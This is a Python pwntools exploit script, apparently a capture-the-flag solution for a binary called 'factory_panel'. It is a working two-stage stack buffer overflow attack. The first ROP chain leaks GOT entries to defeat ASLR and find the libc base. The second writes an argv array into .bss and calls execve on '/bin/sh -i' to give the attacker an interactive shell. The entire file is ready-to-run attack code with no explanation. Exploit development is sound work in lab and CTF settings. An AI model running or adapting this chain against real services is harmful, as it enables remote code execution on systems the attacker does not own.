#!/usr/bin/env python3
from pwn import *
import os

HOST = os.environ.get("HOST", "127.0.0.1")
PORT = int(os.environ.get("PORT", "1337"))

BIN_PATH = os.path.join(os.path.dirname(__file__), "factory_panel")
LIBC_PATH = os.path.join(os.path.dirname(__file__), "libc.so.6")

context.binary = BIN_PATH
context.terminal = ["bash", "-c"]
context.log_level = "info"

e = ELF(BIN_PATH, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)

def open_io():
    io = remote(HOST, PORT)
    return io

def choose(io, n):
    io.recvuntil(b"> ")
    io.sendline(str(n).encode())

def wait_robot_prompt(io):
    io.recvregex(br":\r?\n")

def stage1_leak_puts(io):
    choose(io, 4)
    wait_robot_prompt(io)

    rop = ROP(e)
    pop_rdi     = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]
    pop_rdx     = rop.find_gadget(["pop rdx", "ret"])[0]
    ret         = rop.find_gadget(["ret"])[0]

    write_plt = e.plt["write"]
    main_addr = e.symbols["main"]

    offset = 64 + 8
    payload  = b"A"*offset

    for name in ("puts", "write"):
        got = e.got[name]
        payload += p64(pop_rdi)     + p64(1)
        payload += p64(pop_rsi_r15) + p64(got) + p64(0)
        payload += p64(pop_rdx)     + p64(8)
        payload += p64(write_plt)

    payload += p64(ret) + p64(main_addr)
    io.send(payload)

    puts_leak  = u64(io.recvn(8))
    write_leak = u64(io.recvn(8))
    log.success(f"puts  leak: {hex(puts_leak)}")
    log.success(f"write leak: {hex(write_leak)}")
    
    libc.address = puts_leak - libc.symbols["puts"]
    log.info(f"libc base: {hex(libc.address)}")

    io.recvuntil(b"> ")
    return {"puts": puts_leak, "write": write_leak}

def stage2_execve_shell(io):
    io.sendline(b"4")
    wait_robot_prompt(io)

    rop = ROP(e)
    pop_rdi     = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]
    pop_rdx     = rop.find_gadget(["pop rdx", "ret"])[0]
    ret         = rop.find_gadget(["ret"])[0]

    read_plt = e.plt["read"]
    execve   = libc.symbols["execve"]
    binsh    = next(libc.search(b"/bin/sh\x00"))

    bss       = e.bss() + 0x400
    argv_ptr  = bss
    arg_i_ptr = bss + 0x40

    offset = 64 + 8
    payload  = b"B"*offset

    payload += p64(pop_rdi)     + p64(0)
    payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
    payload += p64(pop_rdx)     + p64(0x50)
    payload += p64(read_plt)

    payload += p64(ret)
    payload += p64(pop_rdi)     + p64(binsh)
    payload += p64(pop_rsi_r15) + p64(argv_ptr) + p64(0)
    payload += p64(pop_rdx)     + p64(0)
    payload += p64(execve)

    io.send(payload)

    argv_blob  = p64(binsh)
    argv_blob += p64(arg_i_ptr)
    argv_blob += p64(0)
    argv_blob += b"\x00"*(0x40-len(argv_blob))
    argv_blob += b"-i\x00"

    io.send(argv_blob)

def main():
    io = open_io()
    stage1_leak_puts(io)
    stage2_execve_shell(io)

    io.interactive()

if __name__ == "__main__":
    main()
